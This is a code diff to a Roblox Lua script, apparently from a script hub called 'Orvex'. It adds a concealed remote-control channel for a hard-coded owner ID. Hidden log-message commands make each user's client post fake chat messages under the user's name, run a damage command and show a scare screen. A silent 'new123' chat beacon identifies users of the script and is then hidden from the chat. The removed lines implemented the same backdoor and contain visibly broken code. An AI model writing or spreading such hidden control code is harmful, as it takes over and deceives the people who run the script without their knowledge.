@@ -670,29 +670,15 @@ Icon = "rbxassetid://80387863064905"
 })
 
 task.spawn(function()
-    local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+    local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
+    
     local DONO_ID = 2980742903
+    local telaSusto = nil
+    local loopSusto = nil
 
-    -- Cria as instâncias de ponte em memória caso não existam
-    local PonteOrdens = RobloxReplicatedStorage:FindFirstChild("OrvexNetworkComms") or Instance.new("StringValue", RobloxReplicatedStorage)
-    PonteOrdens.Name = "OrvexNetworkComms"
-
-    local ListaAtivos = RobloxReplicatedStorage:FindFirstChild("OrvexActiveClients") or Instance.new("StringValue", RobloxReplicatedStorage)
-    ListaActive.Name = "OrvexActiveClients"
-
-    -- Registra silenciosamente a presença do script na memória compartilhada
-    task.spawn(function()
-        while task.wait(1.5) do
-            local str = ListaAtivos.Value
-            if not string.find(str, jogador.Name) then
-                ListaAtivos.Value = str == "" and jogador.Name or str .. "," .. jogador.Name
-            end
-        end
-    end)
-
-    -- Injeta a identificação visual (Tag) que apenas o Dono consegue enxergar
     local function aplicarTagDono()
-        if game:GetService("Players").LocalPlayer.UserId ~= DONO_ID then return end
+        if game:GetService("Players").LocalPlayer.UserId == DONO_ID then return end
         local head = jogador.Character and jogador.Character:WaitForChild("Head", 10)
         if head and not head:FindFirstChild("OrvexUserTag") then
             local tagGui = Instance.new("BillboardGui", head)
@@ -716,16 +702,15 @@ task.spawn(function()
     if jogador.Character then aplicarTagDono() end
     jogador.CharacterAdded:Connect(function() task.wait(1) aplicarTagDono() end)
 
-    local telaSusto = nil
-    local loopSusto = nil
-
     local function executarOrdem(cmd, arg)
-        if cmd == "FakeMessage" then
-            local TextChatService = game:GetService("TextChatService")
-            local canal = TextChatService:WaitForChild("TextChannels", 10):FindFirstChild("RBXGeneral")
-            if canal then
+        if cmd == "SolicitarVerificacao" then
+            if canalGeral then
+                pcall(function() canalGeral:SendAsync("new123") end)
+            end
+        elseif cmd == "FakeMessage" then
+            if canalGeral then
                 pcall(function()
-                    canal:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
+                    canalGeral:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
                 end)
             end
         elseif cmd == "Danificar" then
@@ -759,13 +744,18 @@ task.spawn(function()
         end
     end
 
-    -- Fica escutando as mudanças na memória local instantaneamente
-    PonteOrdens.Changed:Connect(function(valor)
-        if valor == "" then return end
-        local dados = string.split(valor, "|")
-        local alvoNome, comando, argumento = dados, dados, dados
-        if alvoNome == jogador.Name then
-            task.spawn(executarOrdem, comando, argumento)
-        end
+    -- Escuta os logs locais gerados pelo painel admin de forma oculta
+    game:GetService("LogService").MessageOut:Connect(function(msg)
+        local c, a = string.match(msg, "^%[ORVEX%-SYS%-CMD%]%s*(%w+)%s*|%s*(.*)$")
+        if c then task.spawn(executarOrdem, c, a) end
+        if string.find(msg, "[ORVEX-SYS-REQ]") then task.spawn(executarOrdem, "SolicitarVerificacao", "") end
     end)
+
+    -- Intercepta e esconde o "new123" enviado no chat
+    TextChatService.OnIncomingMessage = function(mensagemObj)
+        if mensagemObj.Text == "new123" then
+            mensagemObj.Text = ""
+            return nil
+        end
+    end
 end)
